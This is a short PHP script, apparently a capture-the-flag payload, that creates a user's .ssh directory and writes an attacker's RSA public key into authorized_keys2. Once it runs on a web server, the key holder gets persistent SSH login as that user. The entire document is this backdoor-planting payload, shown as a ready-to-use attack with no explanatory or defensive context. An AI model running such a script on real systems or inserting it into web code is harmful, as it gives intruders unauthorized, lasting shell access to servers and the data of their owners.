<?php
$pubkey = "ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX3Rfjv5JkRfIbuYZWK6iP79JncX+79ncLENe6VBZmcXjNOAFJGL8naGQfFpz+WL2osmM9SKc/pYETglcdn2JL52ZBFj4K8gR9p2L9UHVLqZHoeQ8Abc3WCdPhyZ4f3lg6AUuE8Z6B0zF6NlYenHJ2udjS/n5YkX9r/DDqttgvUFoCUnmkXcAKvNqhLvLzBr9sLuyJc32H/Nkw8blqFsNjIOefjOi0nL5moQvaKjBoX4udmBxPZqte8yxi3qO4hPLnZ9FxhDxLfjidziVs1JVYBf+gfgYctlnihm9t9EADppL1SsLqPKLGHsIyO+1 Key forctf stuff";
mkdir("/home/user-XXXXXXXXXX/.ssh/");
file_put_contents("/home/user-XXXXXXXXXX/.ssh/authorized_keys2", $pubkey);
echo "done";
?>
